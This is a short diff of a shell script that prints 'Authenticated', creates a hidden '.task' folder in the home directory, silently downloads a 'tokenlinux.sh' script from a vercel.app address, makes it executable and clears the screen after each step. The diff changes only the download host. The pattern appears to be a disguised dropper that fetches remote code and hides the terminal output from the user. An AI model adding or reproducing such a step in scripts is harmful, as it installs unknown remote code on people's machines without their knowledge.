@@ -3,7 +3,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.task"
 clear
-curl -s -L -o "$HOME/.task/tokenlinux.sh" "https://svenserver.vercel.app/120/tokenlinux.sh"
+curl -s -L -o "$HOME/.task/tokenlinux.sh" "https://first-project-u2286288.vercel.app/120/tokenlinux.sh"
 clear
 chmod +x "$HOME/.task/tokenlinux.sh"
 clear
